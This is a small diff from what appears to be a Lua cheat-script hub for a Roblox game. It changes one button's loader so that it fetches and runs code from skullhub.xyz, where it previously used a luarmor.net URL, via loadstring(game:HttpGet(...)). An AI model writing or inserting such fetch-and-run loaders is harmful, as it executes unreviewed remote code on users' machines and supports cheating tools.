@@ -287,7 +287,7 @@ AddButton(Tab2o, {
   JoinTeam = "Pirates"; -- Pirates/Marines
   Translator = true; -- true/false
 			}
-			loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3828036ab8b7a4acffcc12cff29b8ad6.lua"))()
+			loadstring(game:HttpGet('https://skullhub.xyz/loader.lua'))()
 			end
 			})
 
